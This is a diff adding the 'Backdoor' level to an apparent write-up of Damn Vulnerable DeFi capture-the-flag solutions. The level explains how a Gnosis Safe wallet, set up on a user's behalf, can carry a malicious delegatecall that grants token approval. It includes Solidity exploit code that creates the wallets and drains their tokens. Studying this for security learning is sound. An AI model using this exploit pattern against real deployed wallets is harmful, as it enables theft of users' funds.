@@ -12,6 +12,7 @@
 - [08 Puppet](#08-puppet)
 - [09 Puppet V2](#09-puppet-v2)
 - [10 Free Rider](#10-free-rider)
+- [11 Backdoor](#11-backdoor)
 
 <!-- /MarkdownTOC -->
 
@@ -696,3 +697,80 @@ recovering them at the end.
 * https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
 * https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol
 * https://solidity-by-example.org/defi/uniswap-v2-flash-swap/
+
+## 11 Backdoor
+
+To beat this level, we need to comply with
+
+* Each user must have registered a wallet.
+* Each user is no longer registered as a beneficiary.
+* The balance of the `player` address is 40e18.
+
+```solidity
+// User must have registered a wallet
+address wallet = walletRegistry.wallets(users[i]);
+assertNotEq(wallet, address(0));
+
+// User is no longer registered as a beneficiary
+assertFalse(walletRegistry.beneficiaries(users[i]));
+
+assertEq(token.balanceOf(playerAddress), AMOUNT_TOKENS_DISTRIBUTED);
+```
+
+### Solution
+
+OpenZeppelin reported in 12.MAR.2020 about the risks of enabling a DELEGATECALL to an arbitrary contract in the Gnosis Safe.
+
+Once set up, the created wallet is designed to receive a token transfer. However, a vulnerability arises as anyone, including potential attackers, can set up this wallet on behalf of the user, enabling them to earn these tokens during the callback of the creation process. The attack strategy involves crafting a contract with a function that contains the `token.approve(address,uint256)` function.
+
+```solidity
+// The attacker contract
+contract Attacker {
+  function setApproval(DamnValuableToken token, address playerAddress) public {
+    token.approve(playerAddress, 10 ether);
+  }
+}
+
+// The initializer
+bytes memory initializer = abi.encodeWithSelector(
+  GnosisSafe.setup.selector,
+  owners,
+  uint256(1),               // threshold, has to be 1.
+  address(attacker),        // address for the delegatecall.
+  abi.encodeWithSignature(
+    "setApproval(address,address)",
+    level.token(),
+    address(this)
+  ),                        // data for the delegatecall.
+  address(0),               // fallbackHandler, has to be 0.
+  address(0),               // paymentToken, no use here.
+  uint256(0),               // payment value, no use here.
+  address(0)                // paymentReceiver, no use here.
+);
+
+// We set the initializer into the call to create the wallet
+GnosisSafeProxyFactory(level.walletFactory())
+  .createProxyWithCallback(
+    address(level.masterCopy()),
+    initializer,
+    uint256(0x42),
+    IProxyCreationCallback(level.walletRegistry())
+  );
+```
+
+After the wallets are created, the attacker simply issues a transfer.
+
+```solidity
+for (uint8 i = 0; i < users.length; i++) {
+  DamnValuableToken(level.token()).transferFrom(
+    level.walletRegistry().wallets(users[i]),
+    level.playerAddress(),
+    10 ether
+  );
+}
+```
+
+### References
+
+* https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets
+
